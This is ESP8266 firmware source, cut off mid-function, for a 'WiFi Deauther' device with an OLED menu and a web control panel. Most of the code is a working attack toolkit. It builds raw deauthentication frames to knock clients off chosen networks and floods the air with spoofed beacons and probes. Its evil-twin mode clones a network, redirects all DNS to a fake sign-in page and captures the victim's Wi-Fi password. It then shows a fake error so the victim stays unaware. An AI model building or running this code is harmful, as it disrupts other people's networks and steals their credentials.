#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <SSD1306Wire.h>
#include <TimeLib.h>

extern "C" {
  #include "user_interface.h"
}

// Forward declarations
void handleEvilTwinPortal();
void handleEvilTwinConnect();

// OLED Configuration
#define OLED_SDA 4  // D2
#define OLED_SCL 5  // D1
#define OLED_ADDR 0x3C
SSD1306Wire display(OLED_ADDR, OLED_SDA, OLED_SCL);

// Button Configuration (2 buttons: UP, OK)
#define BTN_UP 14     // D5 (Up)
#define BTN_OK 13     // D7 (OK)

// LED Indicator
#define LED_PIN 2     // D4 (built-in LED)

// App Configuration
#define VERSION "2.2"
#define MAX_APS 50
#define MAX_SSIDS 20
#define CHANNEL_HOP_INTERVAL 200
#define SCAN_INTERVAL 30000

// Menu States
enum MenuState {
  HOME_SCREEN,
  SCAN_NETWORKS,
  SELECT_NETWORK,
  ATTACK_MENU,
  DEAUTH_ATTACK,
  EVIL_TWIN_ATTACK,
  BEACON_ATTACK,
  PROBE_ATTACK,
  CLOCK_SETTINGS,
  SET_HOUR,
  SET_MINUTE,
  SCAN_RESULTS,
  EVIL_TWIN_PASSWORD
};

// Attack Modes
enum AttackMode {
  ATTACK_OFF,
  ATTACK_DEAUTH,
  ATTACK_EVIL_TWIN,
  ATTACK_BEACON,
  ATTACK_PROBE
};

// Network Structure
struct AccessPoint {
  String ssid;
  String bssid;
  int rssi;
  uint8_t channel;
  bool selected;
};

// Global Variables
MenuState currentMenu = HOME_SCREEN;
MenuState previousMenu = HOME_SCREEN;
AttackMode currentAttack = ATTACK_OFF;
uint8_t currentChannel = 1;
bool channelHop = true;
uint32_t lastScanTime = 0;
uint32_t packetsSent = 0;
uint8_t selectedNetwork = 0;
uint8_t menuPosition = 0;
time_t currentTime = 0;
String capturedPassword = "";

// Network Lists
AccessPoint accessPoints[MAX_APS];
uint8_t apCount = 0;

// SSID List for Beacon/Probe
String beaconSSIDs[MAX_SSIDS] = {
  "Free_WiFi",
  "Airport_WiFi",
  "CoffeeShop",
  "Hotel_Guest",
  "Public_Network",
  "Starbucks",
  "Library_WiFi",
  "Train_Station",
  "Shopping_Mall",
  "Restaurant"
};
uint8_t ssidCount = 10;

// Evil Twin Configuration
String evilTwinSSID = "Free_WiFi";
String evilTwinPassword = "password123";

// Web Server
ESP8266WebServer webServer(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);

void initDisplay() {
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.clear();
  display.display();
}

String formatTime() {
  char timeStr[6];
  snprintf(timeStr, sizeof(timeStr), "%02d:%02d", hour(currentTime), minute(currentTime));
  return String(timeStr);
}

void updateDisplay() {
  display.clear();
  
  // Variables that might be used in multiple cases
  uint8_t count = 0;
  uint8_t startIdx = 0;
  String timeStr = formatTime();
  
  // Move these variables outside the switch to avoid initialization skipping
  String backOption;
  uint8_t maxDisplay;

  switch (currentMenu) {
    case HOME_SCREEN:
      display.drawString(0, 0, "WiFi Deauther v" VERSION);
      display.drawString(0, 12, "1. Scan Networks");
      display.drawString(0, 24, "2. Attack Menu");
      display.drawString(0, 36, "3. Clock Settings");
      display.drawString(0, 48, "4. Back");
      display.drawString(120, 12 + (menuPosition * 12), ">");
      break;
      
    case SCAN_NETWORKS:
      display.drawString(0, 0, "Scanning Networks...");
      display.drawString(0, 12, "Channel: " + String(currentChannel));
      display.drawString(0, 24, "APs Found: " + String(apCount));
      display.drawString(0, 36, "Press OK to view");
      display.drawString(0, 48, "Press UP to back");
      break;
      
    case SCAN_RESULTS:
      display.drawString(0, 0, "Scan Results (" + String(apCount) + ")");
      
      // Show networks (up to 3 to leave room for back option)
      maxDisplay = (apCount > 3) ? 3 : apCount;
      startIdx = (menuPosition >= apCount) ? 0 : (menuPosition < maxDisplay ? 0 : menuPosition - maxDisplay + 1);
      
      for (uint8_t i = 0; i < maxDisplay && (startIdx + i) < apCount; i++) {
        uint8_t idx = startIdx + i;
        String line = String(idx + 1) + ". " + accessPoints[idx].ssid.substring(0, 10);
        if (accessPoints[idx].selected) line += "*";
        display.drawString(0, 12 + (i * 12), line);
        
        // Show cursor for current selection if it's a network
        if (menuPosition == idx) {
          display.drawString(120, 12 + (i * 12), ">");
        }
      }
      
      // Always show back option as the last item
      backOption = String(apCount + 1) + ". Back";
      display.drawString(0, 12 + (maxDisplay * 12), backOption);
      
      // Show cursor for back option
      if (menuPosition >= apCount) {
        display.drawString(120, 12 + (maxDisplay * 12), ">");
      }
      
      if (apCount > 3) {
        display.drawString(90, 48, String(menuPosition + 1) + "/" + String(apCount + 1));
      }
      break;
      
    case SELECT_NETWORK:
      display.drawString(0, 0, "Selected Networks:");
      count = 0;
      for (uint8_t i = 0; i < apCount && count < 4; i++) {
        if (accessPoints[i].selected) {
          display.drawString(0, 12 + (count * 12), String(i + 1) + ". " + accessPoints[i].ssid.substring(0, 10));
          count++;
        }
      }
      if (count == 0) {
        display.drawString(0, 12, "No networks selected");
      }
      display.drawString(0, 36, "1. Start Deauth");
      display.drawString(0, 48, "2. Evil Twin");
      display.drawString(120, 36 + (menuPosition * 12), ">");
      break;
      
    case ATTACK_MENU:
      display.drawString(0, 0, "Attack Menu");
      display.drawString(0, 12, "1. Deauth Attack");
      display.drawString(0, 24, "2. Evil Twin");
      display.drawString(0, 36, "3. Beacon Spam");
      display.drawString(0, 48, "4. Back");
      display.drawString(120, 12 + (menuPosition * 12), ">");
      break;
      
    case DEAUTH_ATTACK:
      display.drawString(0, 0, "Deauth Attack Running");
      display.drawString(0, 12, "Channel: " + String(currentChannel));
      display.drawString(0, 24, "Packets Sent: " + String(packetsSent));
      display.drawString(0, 36, "Targets: " + String(countSelectedNetworks()));
      display.drawString(0, 48, "1. Stop 2. Back");
      display.drawString(120, 48 - (menuPosition * 12), ">");
      break;
      
    case EVIL_TWIN_ATTACK:
      display.drawString(0, 0, "Evil Twin Running");
      display.drawString(0, 12, "SSID: " + evilTwinSSID);
      display.drawString(0, 24, "Clients: " + String(WiFi.softAPgetStationNum()));
      if (!capturedPassword.isEmpty()) {
        display.drawString(0, 36, "Pass: " + capturedPassword.substring(0, 10));
      } else {
        display.drawString(0, 36, "Running: " + String(millis() / 1000) + "s");
      }
      display.drawString(0, 48, "1. Stop 2. Back");
      display.drawString(120, 48 - (menuPosition * 12), ">");
      break;
      
    case BEACON_ATTACK:
      display.drawString(0, 0, "Beacon Spam Running");
      display.drawString(0, 12, "Channel: " + String(currentChannel));
      display.drawString(0, 24, "Packets: " + String(packetsSent));
      display.drawString(0, 36, "SSIDs: " + String(ssidCount));
      display.drawString(0, 48, "1. Stop 2. Back");
      display.drawString(120, 48 - (menuPosition * 12), ">");
      break;
      
    case PROBE_ATTACK:
      display.drawString(0, 0, "Probe Flood Running");
      display.drawString(0, 12, "Channel: " + String(currentChannel));
      display.drawString(0, 24, "Packets: " + String(packetsSent));
      display.drawString(0, 36, "SSIDs: " + String(ssidCount));
      display.drawString(0, 48, "1. Stop 2. Back");
      display.drawString(120, 48 - (menuPosition * 12), ">");
      break;
      
    case CLOCK_SETTINGS:
      display.drawString(0, 0, "Clock Settings");
      display.drawString(0, 12, "1. Set Hour");
      display.drawString(0, 24, "2. Set Minute");
      display.drawString(0, 36, "Current Time:");
      display.drawString(0, 48, timeStr);
      display.drawString(120, 12 + (menuPosition * 12), ">");
      break;
      
    case SET_HOUR:
      display.drawString(0, 0, "Set Hour");
      display.drawString(0, 12, "Current: " + String(hour(currentTime)));
      display.drawString(0, 24, "New Hour: " + String(menuPosition));
      display.drawString(0, 36, "UP to change");
      display.drawString(0, 48, "OK:Confirm 2.Back");
      break;
      
    case SET_MINUTE:
      display.drawString(0, 0, "Set Minute");
      display.drawString(0, 12, "Current: " + String(minute(currentTime)));
      display.drawString(0, 24, "New Minute: " + String(menuPosition));
      display.drawString(0, 36, "UP to change");
      display.drawString(0, 48, "OK:Confirm 2.Back");
      break;
      
    case EVIL_TWIN_PASSWORD:
      display.drawString(0, 0, "Evil Twin Password");
      display.drawString(0, 12, "SSID: " + evilTwinSSID);
      display.drawString(0, 24, "Password: " + evilTwinPassword);
      display.drawString(0, 36, "UP to change");
      display.drawString(0, 48, "OK:Confirm 2.Back");
      break;
  }
  
  display.display();
}

uint8_t countSelectedNetworks() {
  uint8_t count = 0;
  for (uint8_t i = 0; i < apCount; i++) {
    if (accessPoints[i].selected) count++;
  }
  return count;
}

void initButtons() {
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
}

void handleButtons() {
  static uint32_t lastButtonPress = 0;
  if (millis() - lastButtonPress < 200) return;
  
  // UP Button - Move up in menus or go back
  if (digitalRead(BTN_UP) == LOW) {
    lastButtonPress = millis();
    
    // First check if we should go back
    if (currentMenu == SCAN_NETWORKS || currentMenu == SCAN_RESULTS) {
      currentMenu = HOME_SCREEN;
      menuPosition = 0;
      return;
    }
    
    switch (currentMenu) {
      case HOME_SCREEN:
      case ATTACK_MENU:
      case CLOCK_SETTINGS:
        menuPosition = (menuPosition - 1 + 4) % 4; // Ensure positive modulo
        break;
      case SCAN_RESULTS:
        // Navigate through networks + back option (wraparound)
        if (menuPosition > 0) {
          menuPosition--;
        } else {
          menuPosition = apCount; // Wrap to back option
        }
        break;
      case SELECT_NETWORK:
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
      case SET_HOUR:
      case SET_MINUTE:
      case EVIL_TWIN_PASSWORD:
        menuPosition = (menuPosition - 1 + 2) % 2;
        break;
      default:
        break;
    }
  }
  
  // OK Button - Select/Confirm
  if (digitalRead(BTN_OK) == LOW) {
    lastButtonPress = millis();
    switch (currentMenu) {
      case HOME_SCREEN:
        if (menuPosition == 0) {
          currentMenu = SCAN_NETWORKS;
          scanNetworks();
        } else if (menuPosition == 1) {
          currentMenu = ATTACK_MENU;
          menuPosition = 0;
        } else if (menuPosition == 2) {
          currentMenu = CLOCK_SETTINGS;
          menuPosition = 0;
        } else if (menuPosition == 3) {
          // Back option - does nothing on home screen
        }
        break;
        
      case SCAN_NETWORKS:
        if (apCount > 0) {
          currentMenu = SCAN_RESULTS;
          menuPosition = 0;
        } else {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case SCAN_RESULTS:
        // Check if selecting back option
        if (menuPosition >= apCount) {
          currentMenu = SCAN_NETWORKS;
          menuPosition = 0;
        } else {
          // Toggle network selection
          accessPoints[menuPosition].selected = !accessPoints[menuPosition].selected;
        }
        break;
        
      case SELECT_NETWORK:
        if (menuPosition == 0) {
          if (countSelectedNetworks() > 0) {
            startAttack(ATTACK_DEAUTH);
            currentMenu = DEAUTH_ATTACK;
          }
        } else if (menuPosition == 1) {
          if (countSelectedNetworks() == 1) {
            for (uint8_t i = 0; i < apCount; i++) {
              if (accessPoints[i].selected) {
                evilTwinSSID = accessPoints[i].ssid;
                break;
              }
            }
            currentMenu = EVIL_TWIN_PASSWORD;
          }
        }
        break;
        
      case ATTACK_MENU:
        if (menuPosition == 0) {
          if (countSelectedNetworks() > 0) {
            startAttack(ATTACK_DEAUTH);
            currentMenu = DEAUTH_ATTACK;
          }
        } else if (menuPosition == 1) {
          currentMenu = SELECT_NETWORK;
          menuPosition = 1;
        } else if (menuPosition == 2) {
          startAttack(ATTACK_BEACON);
          currentMenu = BEACON_ATTACK;
        } else {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case CLOCK_SETTINGS:
        if (menuPosition == 0) {
          currentMenu = SET_HOUR;
          menuPosition = hour(currentTime);
        } else if (menuPosition == 1) {
          currentMenu = SET_MINUTE;
          menuPosition = minute(currentTime);
        } else {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case SET_HOUR:
        if (menuPosition == 0) {
          setTime(menuPosition, minute(currentTime), second(currentTime), day(currentTime), month(currentTime), year(currentTime));
          currentMenu = CLOCK_SETTINGS;
        } else {
          currentMenu = CLOCK_SETTINGS;
        }
        break;
        
      case SET_MINUTE:
        if (menuPosition == 0) {
          setTime(hour(currentTime), menuPosition, second(currentTime), day(currentTime), month(currentTime), year(currentTime));
          currentMenu = CLOCK_SETTINGS;
        } else {
          currentMenu = CLOCK_SETTINGS;
        }
        break;
        
      case EVIL_TWIN_PASSWORD:
        if (menuPosition == 0) {
          startAttack(ATTACK_EVIL_TWIN);
          currentMenu = EVIL_TWIN_ATTACK;
        } else {
          currentMenu = SELECT_NETWORK;
        }
        break;
        
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
        if (menuPosition == 0) {
          stopAttack();
        }
        currentMenu = ATTACK_MENU;
        break;
    }
  }
}

void initWiFi() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Deauther", "deauther");
  dnsServer.start(53, "*", apIP);
  WiFi.setOutputPower(20.5);
  WiFi.setPhyMode(WIFI_PHY_MODE_11N);
}

void scanNetworks() {
  apCount = 0;
  WiFi.scanNetworks(true, true);
  
  int16_t scanResult;
  do {
    delay(100);
    scanResult = WiFi.scanComplete();
  } while (scanResult == WIFI_SCAN_RUNNING);

  if (scanResult > 0) {
    apCount = (scanResult < MAX_APS) ? scanResult : MAX_APS;
    for (int i = 0; i < apCount; i++) {
      accessPoints[i].ssid = WiFi.SSID(i);
      accessPoints[i].bssid = WiFi.BSSIDstr(i);
      accessPoints[i].rssi = WiFi.RSSI(i);
      accessPoints[i].channel = WiFi.channel(i);
      accessPoints[i].selected = false;
    }
  }
  
  WiFi.scanDelete();
  lastScanTime = millis();
}

void startAttack(AttackMode mode) {
  if (currentAttack != ATTACK_OFF) {
    stopAttack();
  }
  
  currentAttack = mode;
  packetsSent = 0;
  capturedPassword = "";
  digitalWrite(LED_PIN, HIGH);
  
  if (mode == ATTACK_EVIL_TWIN) {
    // Stop current AP and start evil twin
    WiFi.softAPdisconnect(true);
    delay(100);
    
    // Create the evil twin AP
    WiFi.softAP(evilTwinSSID.c_str(), "", 1, 0, 4); // Open network for easier connection
    
    // Stop and clear existing web server handlers
    webServer.stop();
    webServer.close();
    
    // Setup captive portal handlers
    webServer.on("/", handleEvilTwinPortal);
    webServer.on("/index.html", handleEvilTwinPortal);
    webServer.on("/generate_204", handleEvilTwinPortal);  // Android captive portal
    webServer.on("/fwlink", handleEvilTwinPortal);       // Microsoft captive portal  
    webServer.on("/hotspot-detect.html", handleEvilTwinPortal); // Apple captive portal
    webServer.on("/connectivitycheck.gstatic.com", handleEvilTwinPortal); // Google
    webServer.on("/connect", HTTP_POST, handleEvilTwinConnect);
    webServer.onNotFound(handleEvilTwinPortal); // Catch all other requests
    
    webServer.begin();
    
    // Configure DNS to redirect all requests to our IP
    dnsServer.stop();
    dnsServer.start(53, "*", WiFi.softAPIP());
  }
}

void stopAttack() {
  if (currentAttack == ATTACK_EVIL_TWIN) {
    // Stop evil twin and restore normal operation
    WiFi.softAPdisconnect(true);
    delay(100);
    
    // Restart our management AP
    WiFi.softAP("Deauther", "deauther");
    
    // Stop and restart DNS server
    dnsServer.stop();
    dnsServer.start(53, "*", apIP);
    
    // Stop and reinitialize web server
    webServer.stop();
    webServer.close();
    initWebServer();
  }
  
  currentAttack = ATTACK_OFF;
  digitalWrite(LED_PIN, LOW);
}

void executeAttack() {
  if (currentAttack == ATTACK_OFF) return;
  
  // Variables used in multiple cases
  uint8_t mac[6];
  String macStr;

  switch (currentAttack) {
    case ATTACK_DEAUTH:
      for (uint8_t i = 0; i < apCount; i++) {
        if (accessPoints[i].selected) {
          sendDeauth(accessPoints[i].bssid, "FF:FF:FF:FF:FF:FF", accessPoints[i].channel);
          delay(10);
        }
      }
      break;
      
    case ATTACK_BEACON:
      generateRandomMac(mac);
      macStr = macToString(mac);
      sendBeacon(macStr, beaconSSIDs[random(ssidCount)], currentChannel, random(2));
      delay(50);
      break;
      
    case ATTACK_PROBE:
      generateRandomMac(mac);
      macStr = macToString(mac);
      sendProbe(macStr, beaconSSIDs[random(ssidCount)], currentChannel);
      delay(50);
      break;
      
    case ATTACK_EVIL_TWIN:
      // Nothing needed here as it runs automatically as AP
      break;
  }
}

void sendDeauth(String apMac, String stMac, uint8_t ch) {
  wifi_set_channel(ch);
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
  };
  
  uint8_t apMacBytes[6];
  uint8_t stMacBytes[6];
  macToBytes(apMac, apMacBytes);
  macToBytes(stMac, stMacBytes);
  
  memcpy(deauthPacket + 4, stMacBytes, 6);
  memcpy(deauthPacket + 10, apMacBytes, 6);
  memcpy(deauthPacket + 16, apMacBytes, 6);
  
  if (wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0) == 0) {
    packetsSent++;
  }
}

void sendBeacon(String mac, String ssid, uint8_t ch, bool wpa2) {
  wifi_set_channel(ch);
  
  uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00
  };
  
  uint8_t macBytes[6];
  macToBytes(mac, macBytes);
  memcpy(beaconPacket + 10, macBytes, 6);
  memcpy(beaconPacket + 16, macBytes, 6);
  
  uint8_t ssidLen = ssid.length();
  beaconPacket[37] = ssidLen;
  memcpy(beaconPacket + 38, ssid.c_str(), ssidLen);
  
  if (wifi_send_pkt_freedom(beaconPacket, 38 + ssidLen + (wpa2 ? 26 : 0), 0) == 0) {
    packetsSent++;
  }
}

void sendProbe(String mac, String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  uint8_t probePacket[128] = {
    0x40, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00
  };
  
  uint8_t macBytes[6];
  macToBytes(mac, macBytes);
  memcpy(probePacket + 10, macBytes, 6);
  
  uint8_t ssidLen = ssid.length();
  probePacket[25] = ssidLen;
  memcpy(probePacket + 26, ssid.c_str(), ssidLen);
  
  if (wifi_send_pkt_freedom(probePacket, 26 + ssidLen + 10, 0) == 0) {
    packetsSent++;
  }
}

void macToBytes(const String& macStr, uint8_t* bytes) {
  for (int i = 0; i < 6; i++) {
    bytes[i] = strtoul(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

String macToString(uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void generateRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  mac[0] &= 0xFE;
  mac[0] |= 0x02;
}

String getAttackStatus() {
  switch(currentAttack) {
    case ATTACK_OFF: return "Idle";
    case ATTACK_DEAUTH: return "Deauth Attack Running";
    case ATTACK_EVIL_TWIN: return "Evil Twin Running";
    case ATTACK_BEACON: return "Beacon Spam Running";
    case ATTACK_PROBE: return "Probe Flood Running";
    default: return "Unknown";
  }
}

String getAttackStatusColor() {
  switch(currentAttack) {
    case ATTACK_OFF: return "gray";
    case ATTACK_DEAUTH: return "red";
    case ATTACK_EVIL_TWIN: return "orange";
    case ATTACK_BEACON: return "blue";
    case ATTACK_PROBE: return "purple";
    default: return "black";
  }
}

void handleEvilTwinPortal() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Sign in to " + evilTwinSSID + "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta http-equiv='refresh' content='0; url=http://" + WiFi.softAPIP().toString() + "'>";
  html += "<style>";
  html += "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; ";
  html += "background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; justify-content: center; }";
  html += ".container { max-width: 400px; background: rgba(255,255,255,0.95); border-radius: 15px; ";
  html += "box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 40px; text-align: center; }";
  html += ".wifi-icon { font-size: 48px; margin-bottom: 20px; color: #667eea; }";
  html += "h1 { color: #333; margin-bottom: 10px; font-size: 24px; }";
  html += ".ssid { color: #666; margin-bottom: 30px; font-size: 16px; }";
  html += "form { margin-top: 20px; }";
  html += "input[type='password'] { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #e1e5e9; ";
  html += "border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: border-color 0.3s; }";
  html += "input[type='password']:focus { outline: none; border-color: #667eea; }";
  html += "button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; ";
  html += "padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; width: 100%; ";
  html += "font-size: 16px; font-weight: 600; transition: transform 0.2s; }";
  html += "button:hover { transform: translateY(-2px); }";
  html += ".footer { margin-top: 20px; font-size: 12px; color: #888; }";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='wifi-icon'>📶</div>";
  html += "<h1>Connect to Network</h1>";
  html += "<div class='ssid'>\"" + evilTwinSSID + "\"</div>";
  html += "<p>Enter the network password to connect:</p>";
  html += "<form action='/connect' method='POST'>";
  html += "<input type='password' name='password' placeholder='Network Password' required minlength='8'>";
  html += "<button type='submit'>Connect</button>";
  html += "</form>";
  html += "<div class='footer'>Secure connection • Protected by WPA2</div>";
  html += "</div>";
  html += "<script>";
  html += "document.querySelector('form').addEventListener('submit', function(e) {";
  html += "document.querySelector('button').innerHTML = 'Connecting...';";
  html += "document.querySelector('button').disabled = true;";
  html += "});";
  html += "</script>";
  html += "</body></html>";
  webServer.send(200, "text/html", html);
}

void handleEvilTwinConnect() {
  if (webServer.hasArg("password")) {
    capturedPassword = webServer.arg("password");
    
    // Log the capture
    Serial.println("PASSWORD CAPTURED!");
    Serial.println("SSID: " + evilTwinSSID);
    Serial.println("Password: " + capturedPassword);
    Serial.println("Client IP: " + webServer.client().remoteIP().toString());
    Serial.println("---");
    
    // Show fake error to keep user unaware
    String html = "<!DOCTYPE html><html><head>";
    html += "<title>Connection Error</title>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<style>";
    html += "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; ";
    html += "background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; justify-content: center; }";
    html += ".container { max-width: 400px; background: rgba(255,255,255,0.95); border-radius: 15px; ";
    html += "box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 40px; text-align: center; }";
    html += ".error-icon { font-size: 48px; margin-bottom: 20px; color: #ff6b6b; }";
    html += "h1 { color: #ff6b6b; margin-bottom: 20px; font-size: 24px; }";
    html += "p { color: #666; line-height: 1.6; margin-bottom: 30px; }";
    html += ".btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; ";
    html += "padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; ";
    html += "font-size: 16px; font-weight: 600; text-decoration: none; display: inline-block; }";
    html += ".btn:hover { transform: translateY(-2px); }";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<div class='error-icon'>⚠</div>";
    html += "<h1>Connection Failed</h1>";
    html += "<p>Unable to connect to the network. This could be due to:</p>";
    html += "<ul style='text-align: left; color: #666;'>";
    html += "<li>Incorrect password</li>";
    html += "<li>Network congestion</li>";
    html += "<li>Signal interference</li>";
    html += "</ul>";
    html += "<p>Please try connecting again or contact the network administrator.</p>";
    html += "<a href='/' class='btn'>Try Again</a>";
    html += "</div>";
    html += "<script>setTimeout(function(){ window.location.href = '/'; }, 5000);</script>";
    html += "</body></html>";
    webServer.send(200, "text/html", html);
  } else {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
  }
}

void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>WiFi Deauther v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += ":root { --primary: #0d1117; --secondary: #161b22; --accent: #58a6ff; --text: #c9d1d9; }";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: var(--primary); color: var(--text); }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += ".header { background-color: var(--secondary); color: var(--accent); padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid var(--accent); }";
  html += ".card { background-color: var(--secondary); border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
  html += ".status { font-weight: bold; color: " + getAttackStatusColor() + "; }";
  html += ".btn { display: inline-block; padding: 10px 15px; background-color: var(--accent); color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
  html += ".btn-stop { background-color: #f85149; }";
  html += ".btn-scan { background-color: #1f6feb; }";
  html += ".btn-attack { background-color: #d29922; }";
  html += ".nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; }";
  html += ".nav a { text-decoration: none; color: var(--accent); padding: 10px; font-weight: bold; }";
  html += ".nav a.active { border-bottom: 2px solid var(--accent); }";
  html += ".ap-list { margin-top: 15px; }";
  html += ".ap-item { padding: 10px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }";
  html += ".ap-item:hover { background-color: #1f2938; }";
  html += ".selected { background-color: #1f2938; }";
  html += ".form-group { margin-bottom: 15px; }";
  html += "label { display: block; margin-bottom: 5px; font-weight: bold; }";
  html += "input, select { width: 100%; padding: 8px; background-color: var(--primary); border: 1px solid #30363d; border-radius: 4px; box-sizing: border-box; color: var(--text); }";
  html += ".terminal { background-color: var(--primary); border: 1px solid #30363d; border-radius: 4px; padding: 10px; font-family: 'Courier New', monospace; margin-top: 20px; }";
  html += ".blink { animation: blink 1s infinite; }";
  html += "@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }";
  html += "</style></head><body>";
  html += "<div class='header'><h1>WiFi Deauther v" VERSION "</h1></div>";
  
  html += "<div class='container'>";
  
  // Navigation
  html += "<div class='nav'>";
  html += "<a href='/' class='active'>Dashboard</a>";
  html += "<a href='/scan'>Scan</a>";
  html += "<a href='/deauth'>Deauth</a>";
  html += "<a href='/eviltwin'>Evil Twin</a>";
  html += "<a href='/beacon'>Beacon</a>";
  html += "<a href='/probe'>Probe</a>";
  html += "</div>";
  
  // Status card
  html += "<div class='card'>";
  html += "<h2>Status</h2>";
  html += "<p><strong>Mode:</strong> <span class='status'>" + getAttackStatus() + "</span></p>";
  html += "<p><strong>APs Found:</strong> " + String(apCount) + "</p>";
  html += "<p><strong>Time:</strong> " + formatTime() + "</p>";
  
  if (currentAttack == ATTACK_OFF) {
    html += "<a href='/scan' class='btn btn-scan'>Scan Networks</a>";
  } else {
    html += "<a href='/stop' class='btn btn-stop'>Stop Attack</a>";
  }
  
  // Terminal-like output
  html += "<div class='terminal'>";
  html += "<p>> Status: <span class='status'>" + getAttackStatus() + "</span></p>";
  if (currentAttack == ATTACK_EVIL_TWIN && !capturedPassword.isEmpty()) {
    html += "<p>> Captured password: <span style='color:red'>" + capturedPassword + "</span></p>";
  }
  html += "<p>> Ready <span class='blink'>_</span></p>";
  html += "</div>";
  
  html += "</div>";
  
  // Quick actions card
  html += "<div class='card'>";
  html += "<h2>Quick Actions</h2>";
  html += "<a href='/deauth' class='btn btn-attack'>Start Deauth</a>";
  html += "<a href='/eviltwin' class='btn btn-attack'>Start Evil Twin</a>";
  html += "<a href='/beacon' class='btn btn-attack'>Start Beacon</a>";
  html += "<a href='/probe' class='btn btn-attack'>Start Probe</a>";
  html += "</div>";
  
  html += "</div></body></html>";
  webServer.send(200, "text/html", html);
}

void handleScan() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Network Scan - WiFi Deauther v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
